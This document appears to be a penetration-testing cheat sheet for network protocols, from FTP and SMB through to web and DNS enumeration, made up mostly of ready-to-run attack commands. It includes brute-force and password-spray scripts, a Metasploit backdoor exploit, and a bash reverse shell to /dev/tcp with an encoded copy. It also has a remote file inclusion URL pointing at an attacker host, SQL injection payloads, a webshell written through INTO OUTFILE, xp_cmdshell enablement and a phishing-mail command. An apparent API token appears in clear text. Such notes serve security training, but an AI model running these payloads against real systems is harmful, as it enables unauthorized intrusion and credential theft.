## **🛡️ Network Protocols**

### Network protocols allow devices to communicate and exchange data over a network. Here’s an expanded explanation of some commonly used protocols in penetration testing:
---
### **1.📂 FTP (File Transfer Protocol)**
<details>
<summary>📝 Click to expand FTP Information</summary>
 <br>   
- **Port:** 21 (TCP)
- **Function:** FTP is used for transferring files between a client and a server. FTP operates over two channels:
    - **Control channel** (for sending commands)
    - **Data channel** (for transferring the actual files).
- **Common Security Issues:**
    - **Anonymous login:** Some FTP servers are misconfigured to allow anonymous logins, providing unauthorized access to files.
    - **Clear-text credentials:** FTP sends usernames and passwords in clear text, making it vulnerable to sniffing attacks.

---

### **1.1. Penetration Testing on FTP**
FTP enumeration
```bash
ftp <IP>
#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password

put <file> #uploading file
get <file> #downloading file

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa

# Check for vulnerabilities associated with the identified version.
```
![image](https://github.com/user-attachments/assets/70094f78-e27a-446e-a97f-6eb39cff347c)

---
### **1.1.1. Anonymous Login**

When performing penetration testing, an attacker can attempt to log in using **anonymous credentials** if the FTP server allows it. Many misconfigured FTP servers allow anonymous access for easier file sharing, which is a security risk.

**Example FTP login attempt:**

```bash

ftp 192.168.188.131
Name: Anonymous
Password: Anonymous

```
![image](https://github.com/user-attachments/assets/00f9a1e5-3e22-4ad2-86cc-10d990b43574)


If the server allows anonymous login, you will be able to interact with the server and explore its contents.

---

### **1.1.2. Sniffing FTP Credentials (Clear-text Passwords)**

Because FTP doesn’t encrypt traffic, usernames and passwords are sent in clear text. An attacker can use sniffing tools to capture this data, which can be used to compromise the server.

- **Wireshark:** A tool that can capture network packets and allow an attacker to see the FTP credentials.

**How to sniff credentials:**

1. **Start an FTP session**:
    
    ```bash
    
    ftp 192.168.188.131
    
    ```
    
2. **Capture the traffic using Wireshark.**
3. **Follow the TCP stream** to see the credentials:
    - Look for packets containing the string `"PASS"` in Wireshark, which indicates the password being sent.

**Filter clear-text credentials:**

```
frame contains "PASS"
```
![image](https://github.com/user-attachments/assets/84ba48da-79ce-4da8-89d0-0158d5ee9db2)

---

### **1.1.3. FTP Brute-Force Attack (Hydra)**

**Hydra** is a popular tool for performing brute-force attacks against various services, including FTP. It can attempt multiple combinations of usernames and passwords to gain unauthorized access.

**Example of brute-forcing FTP login:**

```bash

hydra -L user -P pass 192.168.188.131 ftp
hydra -L wordlist.txt -P wordlist.txt 192.168.188.131 ftp
use: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

```

- **L** specifies a file with usernames.
- **P** specifies a file with passwords.
- **ftp** is the target protocol.

The **wordlist** file contains a list of possible usernames or passwords to be tried. A strong wordlist (such as **rockyou.txt**) increases the chance of success.
![image](https://github.com/user-attachments/assets/eafa1572-24ac-4ef1-93bd-6734b79ad5e0)

---

### **1.1.4. FTP Remote Shell via Nmap Script**

You can also use **Nmap** to exploit specific vulnerabilities in FTP servers. The `ftp-vsftpd-backdoor.nse` script is designed to exploit a vulnerability in **vsFTPd 2.3.4**, which contains a backdoor.

**Example Nmap command to check for the backdoor:**

```bash

sudo nmap -p 21 192.168.188.131 -sV --script ftp-vsftpd-backdoor.nse

```

This will test if the FTP server is vulnerable to the **vsFTPd backdoor**. If the server is vulnerable, you may be able to execute commands remotely.
![image](https://github.com/user-attachments/assets/48113953-c487-4bfa-bf04-49b376c60901)

---

### **1.1.5. Exploiting FTP Vulnerabilities with Metasploit**

Metasploit is another powerful tool used for exploiting vulnerabilities in systems. If the FTP server is running a vulnerable version of vsFTPd (e.g., **vsFTPd 2.3.4**), Metasploit can be used to exploit it.

**Steps to exploit vsFTPd 2.3.4 with Metasploit:**

1. **Search for the exploit:**
    
    ```bash
    
    msfconsole
    search vsftpd 2.3.4
    
    ```
    
2. **Use the exploit:**
    
    ```bash
  
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOST 192.168.188.131
    exploit
    
    ```
    
3. **Interact with the remote shell:**
    
    ```bash
   
    python -c 'import pty; pty.spawn("/bin/bash")'
    
    ```
    

By exploiting this vulnerability, you can get access to the **root** account on the target machine.
![image](https://github.com/user-attachments/assets/2c266ec1-e757-4442-970e-cc713e589347)

</details> ```
---

### **2.📦 NFS (Network File System)**

NFS allows a system to share its files with other systems over a network. It enables the mounting of remote file systems and interaction with them as if they were local.

**Example Nmap command to scan for NFS services:**

```bash

nmap -p2049 -sV 192.168.188.131

```

If NFS is exposed publicly, it can be mounted to the local machine and files can be accessed.

**Mounting NFS share:**

```bash

sudo mount 192.168.188.131:/ /home/kali/Downloads/nfs -nolock

```

This allows you to access shared files from the remote NFS server.
![image](https://github.com/user-attachments/assets/34ad4003-778a-4011-b5ee-1c63e17adf4a)

**Troubleshooting NFS Mount Permission Issues:**

If you encounter **Permission Denied**, ensure that you have the correct NFS version and permissions configured.
https://blog.christophetd.fr/write-up-vulnix/
**To use NFSv3 (if needed):**

```bash

sudo mount -t nfs -o vers=3 192.168.188.137:/home/vulnix /home/kali/Downloads/nfs/home/vulnix -nolock

```
Let’s take a closer look at the permissions. 
```bash
ls -ld vulnix
```
If only Particuler user or group have access to the Path:
create a user group:
```jsx
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --groups vulnix_group vulnix
sudo -u vulnix ls -l vulnix
```

![image](https://github.com/user-attachments/assets/c5978efc-c909-48b1-8165-5705d484ef0a)


DEBUG

```jsx
id vulnix
```

Ensure it outputs:

```jsx
uid=2008(vulnix) gid=2008(vulnix_group) groups=2008(vulnix_group)
```

If the UID or GID is incorrect, you must delete and recreate the user with:

```jsx
sudo userdel vulnix
sudo groupdel vulnix_group
sudo groupadd --gid 2008 vulnix_group
sudo useradd --uid 2008 --gid 2008 --groups vulnix_group vulnix
```

Now, try accessing the directory as `vulnix_user`:
![image](https://github.com/user-attachments/assets/90546368-1291-4e7a-b7c9-52a148eef779)

---

### **3.🗂️ SMB (Server Message Block)**

SMB is a protocol used for file and printer sharing, as well as inter-process communication between computers.

**Example Nmap command to scan for SMB services:**

```bash

sudo nmap -p 445 -sV -sC 192.168.188.131
locate .nse | grep smb
nmap -p445 --script="name" $IP 

```
![image](https://github.com/user-attachments/assets/5f4b1ffc-baab-4de5-9c0f-dcb520401b1c)


**Enumerating SMB Shares:**

```bash
#In windows we can view like this
net view \\<computername/IP> /all

enum4linux -L -S 192.168.188.131
smbclient -L 192.168.188.131 -N
smbmap -H 192.168.188.131
#If you got user name and password:
smbmap -H 192.168.188.131 -u "msfadmin" -p "msfadmin" -r tmp -A '.*' -q

```

**Brute-forcing SMB credentials:**

```bash

hydra -l admin -P /home/kali/pass.txt smb://192.168.188.131
or
netexec smb 192.168.188.131 -u admin -p /home/kali/pass.txt --continue-on-success

```
![image](https://github.com/user-attachments/assets/c592d34d-613f-49b5-9a92-c3b8c951958a)
```bash
# Smbclient
smbclient -L //IP #or try with 4 /'s
smbclient //server/share
smbclient //server/share -U <username>
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file
```
Downloading shares is easy—if the folder consists of several files, they will all be downloaded by this.
```bash
mask ""
recurse ON
prompt OFF
mget *
```
**Exploit SMB:**
Try to connect with no pass

```jsx
smbclient --no-pass //192.168.188.131/tmp
```

login as Anonymous:

![image](https://github.com/user-attachments/assets/1e13a6c6-3293-4bf3-a01e-bb3303698da0)


since we have smb access i tried:
```jsx
put rev.sh
posix 
chmod +x rev.sh
chown Anonymous rev.sh
open rev.sh
```
But didnt work:
Failed to open file /rev.sh. NT_STATUS_ACCESS_DENIED
![image](https://github.com/user-attachments/assets/4a71afb8-42f0-471e-bebb-bc7bc0a83107)

SMB Version Samba 3.0.20 found, search for exploits:
```bash
searchsploit samba 3.0.20  
locate multiple/remote/10095.txt
cat /usr/share/exploitdb/exploits/multiple/remote/10095.txt
```
![image](https://github.com/user-attachments/assets/6603e3bd-03ea-4424-8d4c-f3aac3acdd52)


---

### **4.🔌 RPC (Remote Procedure Call)**

RPC allows a program on one computer to execute a procedure on another computer.

**Enumerating with RPCClient:**
**Connect to RPC server with an anonymous bind:**
```bash

$ rpcclient -U "" -N <target>
srvinfo
enumdomusers #Enumerate Domain Users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
getdompwinfo #Get Domain Password Info
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups # Enumerate Domain Groups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
querygroupmem 0x200 #Query Group Membership
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users

```

This will provide information about the target system and its users.
![image](https://github.com/user-attachments/assets/1a5d498c-8a6d-4a91-b017-69b62a6cb5e2)

“RID are relative identifier to identify an object which will be in hexa decimal format”

![image](https://github.com/user-attachments/assets/d3e9af35-e0b2-4c72-b893-e7a24141b82a)

**Password Spray Attack**

The following script will iterate over usernames and passwords and try to execute "getusername". Watch out for "ACCOUNT_LOCKED" error messages.

```
TARGET=10.10.10.10;
while read username; do
  while read password; do
    echo -n "[*] user: $username" && rpcclient -U "$username%$password" -c "getusername;quit" $TARGET | grep -v "NT_STATUS_ACCESS_DENIED";
  done < /path/to/passwords.txt
done < /path/to/usernames.txt
```

If a password is found, use it with smbclient to explore the SYSVOL:

```
$ smbclient -U "username%password" \\\\<target>\\SYSVOL
Domain=[HOME] OS=[Windows Server 2008]
...
smb: \> ls
...
```
---

### **5.📡 SNMP (Simple Network Management Protocol)**

SNMP is used to manage and monitor network devices. It can be exploited if the community string is weak or known (like **public** or **private**).
![image](https://github.com/user-attachments/assets/c4d02453-3331-4739-bf58-f38aea7a6133)

**Example SNMP enumeration with `snmpcheck`:**

```bash

snmpcheck -c public -h 192.168.188.131
snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports

```
if community string was public try to connect with snmpcheck
![image](https://github.com/user-attachments/assets/1eef5dc1-7a3e-40e9-9b37-ce2bfea237d9)

try to use snmp walk
![image](https://github.com/user-attachments/assets/3a136368-a50b-4fb4-a7dd-63d72ed69358)

**Brute-forcing SNMP community strings:**

```bash

onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.146.156
or
snmpwalk -v1 -c public 192.168.146.156 NET-SNMP-EXTEND-MIB :: nsExtendObjects

```
https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp/snmp-rce

---

### **6.📚 LDAP (Lightweight Directory Access Protocol)**

LDAP is a protocol used to access and maintain directory information. It is commonly used for managing user information and authentication.

**Enumerating LDAP:**

```bash

ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
#CN name describes the info we're collecting
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users

```

You can also enumerate users and gather information from LDAP directories.

**Using Metasploit for LDAP enumeration:**

```bash

msfconsole
use auxiliary/gather/ldap_query
set RHOSTS <IP>
set BASE "dc=example,dc=com"
run

```

---

### **7. SMTP (Simple Mail Transfer Protocol)**

SMTP is used for sending and receiving emails. It can be exploited in cases of misconfiguration, such as **open relay** or **user enumeration**.

**Enumerating SMTP:**

```bash
nc -nv <IP> 25 #Version Detection
smtp-user-enum -M VRFY -U username.txt -t <IP> # -M means mode; it can be RCPT, VRFY, EXPN

#Sending email with valid credentials, the below is an example of Phishing mail attack
sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

```

This can be used to find valid email addresses on the target system.

**Exploiting Open Relay (sending emails):**

```bash

telnet <IP> 25
HELO attacker.com
MAIL FROM: attacker@attacker.com
RCPT TO: victim@victim.com
DATA
Subject: Test
This is a test email.
.

```
---
### **8. POP3**

**Post Office Protocol** \(**POP**\) is a type of computer networking and Internet standard **protocol** that extracts and retrieves email from a remote mail server for access by the host machine. **POP** is an application layer **protocol** in the OSI model that provides end users the ability to fetch and receive email \(from [here](https://www.techopedia.com/definition/5383/post-office-protocol-pop)\).

The POP clients generally connect, retrieve all messages, store them on the client system, and delete them from the server. There are 3 versions of POP, but POP3 is the most used one.

**Default ports:** 110, 995\(ssl\)

```text
PORT    STATE SERVICE
110/tcp open  pop3
```

## Enumeration

### Banner Grabbing

```bash
nc -nv <IP> 110
openssl s_client -connect <IP>:995 -crlf -quiet
```

## Manual

You can use the command `CAPA` to obtain the capabilities of the POP3 server.

## Automated

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP> #All are default scripts
```

The `pop3-ntlm-info` plugin will return some "**sensitive**" data \(Windows versions\).

### [POP3 bruteforce](../brute-force.md#pop)

## POP syntax

```bash
POP commands:
  USER uid           Log in as "uid"
  PASS password      Substitue "password" for your actual password
  STAT               List number of messages, total mailbox size
  LIST               List messages and sizes
  RETR n             Show message n
  DELE n             Mark message n for deletion
  RSET               Undo any changes
  QUIT               Logout (expunges messages if no RSET)
  TOP msg n          Show first n lines of message number msg
  CAPA               Get capabilities
```

From [here](http://sunnyoasis.com/services/emailviatelnet.html)

Example:

```text
root@kali:~# telnet $ip 110
 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready 
 USER billydean    
 +OK
 PASS password
 +OK Welcome billydean

 list

 +OK 2 1807
 1 786
 2 1021

 retr 1

 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login for remote desktop ... try not to forget it this time!
 username: billydean
 password: PA$$W0RD!Z
```

```

### Identifying Issues

- Clear-text authentication (no SSL/TLS).
- Weak credentials (try common usernames/passwords).
- Default or anonymous access.

### Exploiting

```bash

# Manual login attempt
telnet <IP> 110
USER <username>
PASS <password>

# Hydra brute force
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -s 110 -vV <IP> pop3

```

### References

- HackTricks - POP3
- POP3 RFC 1939
---
### **9.🔒 SSH**

**Secure Shell (SSH)** is a cryptographic network protocol designed for secure communication over an unsecured network. It is primarily used for remote login and command-line execution, replacing older, less secure protocols like Telnet and rlogin
https://www.ssh.com/academy/ssh/public-key-authentication

## SSH enumeration

```
#Login
ssh uname@IP #enter the password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash

#bruteforce
hydra -l uname -P passwords.txt <IP> ssh #'-L' for usernames list, '-l' for username and vice versa

# Check for vulnerabilities associated with the identified version.
```
Use full commands:
- `t rsa`: Specifies the RSA algorithm.
- `b 4096`: Specifies the key length (4096 bits is recommended).
- You can also use `b 2048` for a shorter key length.
- **Follow the prompts:**
- Enter the path to save the key (default is `~/.ssh/id_rsa`).
- Enter a passphrase for the private key (optional but recommended for security).
- You'll have a public key (`~/.ssh/id_rsa.pub`) and a private key (`~/.ssh/id_rsa`).

**2. Copy the Public Key to the Server:**

Use the ssh-copy-id command.

Code

```jsx
    ssh-copy-id -i ~/.ssh/id_rsa.pub user@server_ip_or_hostname
```

- Replace `user` with your username on the server.
- Replace `server_ip_or_hostname` with the server's IP address or hostname.
- **Alternatively, manually copy the public key:**
- Read the contents of `~/.ssh/id_rsa.pub`.
- SSH into the server.
- Create the directory `~/.ssh` if it doesn't exist.
- Create or edit the file `~/.ssh/authorized_keys`.
- Append the contents of your public key to the `authorized_keys` file.
- Change the permissions of `~/.ssh` to `700` and `authorized_keys` to `600`.

Code

```jsx
    mkdir -p ~/.ssh    chmod 700 ~/.ssh   
    touch ~/.ssh/authorized_keys    
    chmod 600 ~/.ssh/authorized_keys    
    cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
```

**3. Log in with the Private Key:**

- **Open your terminal**: on your local machine.
- Use the `ssh` command with the `i` option:
  ```jsx
  ssh -i ~/.ssh/id_rsa user@server_ip_or_hostname
  ssh -oHostKeyAlgorithms=+ssh-rsa TCM@10.10.81.58 -p22
  ```
  ![image](https://github.com/user-attachments/assets/bdb18c28-6296-4013-bd28-4d6edafd81e9)

  ---
**10. HTTP/S enumeration**

- View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
- Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
- check /robots.txt folder
- Look for the hostname and add the relevant one to `/etc/hosts` file.
- Directory and file discovery - Obtain any hidden files that may contain juicy information

```
dirbuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com -w /path/to/wordlist.txt
```

- Vulnerability Scanning using nikto: `nikto -h <url>`
- `HTTPS`SSL certificate inspection, may reveal information like subdomains, usernames…etc
- Default credentials: Identify the CMS or service, check for default credentials, and test them out.
- Bruteforce

```
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.

#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```

- if `cgi-bin` is present, then do further fuzzing and obtain files like .sh or .pl
- Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
- API - Fuzz further, and it can reveal some sensitive information

```
#identifying endpoints using gobuster
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern #pattern can be like {GOBUSTER}/v1 here v1 is just for example, it can be anything

#obtaining info using curl
curl -i http://192.168.50.16:5002/users/v1
```

- If there is any Input field check for **Remote Code execution** or **SQL Injection**
- Check the URL, whether we can leverage **Local or Remote File Inclusion**.
- Also check if there’s any file upload utility(also obtain the location it’s getting reflected)

**Wordpress**

```
# basic usage
wpscan --url "target" --verbose

# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add Wpscan API to get the details of vulnerabilties.
wpscan --url http://alvida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA

#Accessing Wordpress shell
http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro

http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php
```

**Drupal**

```
droopescan scan drupal -u http://site
```

**Joomla**

```
droopescan scan joomla --url http://site
sudo python3 joomla-brute.py -u http://site/ -w passwords.txt -usr username #https://github.com/ajnik/joomla-bruteforce
```
**Web Attacks**

💡 Cross-platform PHP revershell: [

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php))

**Directory Traversal**

```
cat /etc/passwd #displaying content through absolute path
cat ../../../etc/passwd #relative path

# if the pwd is /var/log/ then in order to view the /etc/passwd it will be like this
cat ../../etc/passwd

#In web int should be exploited like this, find a parameters and test it out
http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd
#check for id_rsa, id_ecdsa
#If the output is not getting formatted properly then,
curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd

#For windows
http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt #no need to provide drive
```

- URL Encoding

```
#Sometimes it doesn't show if we try path, then we need to encode them
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

- Wordpress
    - Simple exploit: https://github.com/leonjza/wordpress-shell

**Local File Inclusion**

- The main difference between Directory traversal and this attack is that we can execute commands remotely here.

```
#At first we need
http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami #we're passing a command here

#Reverse shells
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"#We can simply pass a reverse shell to the cmd parameter and obtain reverse-shell
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22 #encoded version of above reverse-shell

#PHP wrapper
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php
```

- Remote file inclusion

```
1. Obtain a php shell
2. host a file server
3.
http://mountaindesserts.com/meteor/index.php?page=http://attacker-ip/simple-backdoor.php&cmd=ls
we can also host a php reverseshell and obtain shell.
```

**SQL Injection**

```
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

- Blind SQL Injection - This can be identified by Time-based SQLI

```
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

- Manual Code Execution

```
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
#Now we can run commands
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from the web, then follow the below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```

- SQLMap - Automated Code Execution

```
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database

#OS Shell
#  Obtain the Post request from Burp suite and save it to post.txt
sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there

```
--
**11. DNS enumeration**

- Better use `Seclists` wordlists for better enumeration. https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS

```
host www.megacorpone.com
host -t mx megacorpone.com
host -t txt megacorpone.com

for ip in $(cat list.txt); do host $ip.megacorpone.com; done #DNS Bruteforce
for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found" #bash bruteforcer to find domain name

## DNS Recon
dnsrecon -d megacorpone.com -t std #standard recon
dnsrecon -d megacorpone.com -D ~/list.txt -t brt #bruteforce, hence we provided list

# DNS Bruteforce using dnsenum
dnsenum megacorpone.com

## NSlookup, a gold mine
nslookup mail.megacorptwo.com
nslookup -type=TXT info.megacorptwo.com 192.168.50.151 #We are querying the information from a specific IP, here it is 192.168.50.151. This can be very useful
```
